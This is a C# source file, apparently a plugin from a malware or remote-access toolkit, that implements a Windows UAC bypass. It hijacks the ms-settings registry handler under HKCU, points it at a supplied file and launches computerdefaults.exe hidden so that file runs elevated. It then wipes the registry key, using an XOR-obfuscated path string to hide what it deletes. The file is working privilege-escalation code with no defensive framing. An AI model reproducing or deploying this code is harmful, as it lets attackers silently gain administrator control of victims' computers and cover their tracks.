using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Plugin
{

    public class ADHS
    {
        public static void eleself(string file)
        {

            suck(file);

        }

        public static RegistryKey Value(string string_0)
        {
            RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\" + string_0, true);
            if (!ADHS.checksubkey(registryKey))
            {
                registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\" + string_0);
            }

            return registryKey;
        }



        public static void suck(string file)
        {
            //if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            //{
            ADHS.Z("Classes");
            ADHS.Z("Classes\\ms-settings");
            ADHS.Z("Classes\\ms-settings\\shell");
            ADHS.Z("Classes\\ms-settings\\shell\\open");
            string cpath = Assembly.GetExecutingAssembly().Location;
            RegistryKey registryKey = ADHS.Z("Classes\\ms-settings\\shell\\open\\command");
            registryKey.SetValue("", file, RegistryValueKind.String);
            registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
            registryKey.Close();
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe",
                    Arguments = "/c start computerdefaults.exe"
                });
            }
            catch
            {
            }

            //Process.GetCurrentProcess().Kill();
            //return;
            //}
            ADHS.Z("Classes\\ms-settings\\shell\\open\\command").SetValue("", "", RegistryValueKind.String);

            Thread.Sleep(10000);

            string ccpath = Assembly.GetExecutingAssembly().Location;
            ADHS.Value(BCutEncrypt("IfkyyoyVVgy'yo~~cdmyVVyboffVVezodVVieggkdn")).DeleteSubKeyTree(ccpath);
        }

        public static string BCutEncrypt(string str)
        {
            char ch1 = '\n';
            StringBuilder stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                char ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }


        public static RegistryKey Z(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            if (!ADHS.checksubkey(registryKey))
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }

            return registryKey;
        }


        public static bool checksubkey(RegistryKey k)
        {
            return k != null;
        }


        private static ManagementObject GetMngObj(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            try
            {
                foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    if (managementObject != null)
                    {
                        return managementObject;
                    }
                }
            }
            catch
            {
            }

            return null;
        }


        public static string GetOsVer()
        {
            string result;
            try
            {
                ManagementObject mngObj = ADHS.GetMngObj("Win32_OperatingSystem");
                if (mngObj == null)
                {
                    result = string.Empty;
                }
                else
                {
                    result = (mngObj["Version"] as string);
                }
            }
            catch (Exception)
            {
                result = string.Empty;
            }

            return result;
        }
    }
}




